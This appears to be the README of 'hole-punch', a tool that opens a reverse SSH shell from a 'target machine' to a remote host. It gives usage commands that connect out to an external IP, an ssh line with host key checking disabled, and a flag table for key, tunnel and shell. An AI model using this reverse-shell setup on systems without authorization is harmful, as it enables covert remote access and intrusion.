# hole-punch

Quickly launch a reverse SSH connection.

```
# on the target machine
hp --key id_rsa --remote user@172.217.164.78:2455

# on the remote
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa -p 3333 127.0.0.1
```

## Options

When defining the remote endpoint, endpoints look like: `user@host:port`

| Flag             | Environment Variable | Default                             | Description                         |
| :--------------- | -------------------- | ----------------------------------- | ----------------------------------- |
| `-k`, `--key`    | `HP_KEY`             |                                     | path to SSH private key             |
| `-r`, `--remote` | `HP_REMOTE`          |                                     | remote SSH endpoint to connect to   |
| `-l`, `--local`  | `HP_LOCAL`           | `127.0.0.1:2222`                    | local SSH endpoint to create        |
| `-s`, `--shell`  | `HP_SHELL`           | `bash` for linux/osx, `cmd` for Win | shell to invoke                     |
| `-t`, `--tunnel` | `HP_TUNNEL`          | `127.0.0.1:3333`                    | tunnel to create on remote endpoint |
